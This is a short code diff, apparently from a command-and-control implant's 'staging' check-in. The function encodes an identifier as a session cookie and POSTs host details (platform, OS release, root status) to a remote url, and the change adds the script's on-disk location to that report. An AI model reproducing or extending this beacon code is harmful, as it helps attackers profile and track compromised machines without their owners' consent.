@@ -28,7 +28,7 @@ def staging(identifier):
 		admin = os.getuid() == 0
 
 	cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
-	os_info = {'platform': platform_name, 'version': platform.release(), 'admin':admin}
+	os_info = {'platform': platform_name, 'version': platform.release(), 'admin':admin,'location' : os.path.dirname(os.path.realpath(__file__))}
 	r = requests.post(url = url,cookies = cookies, data = os_info)
 	return r
 
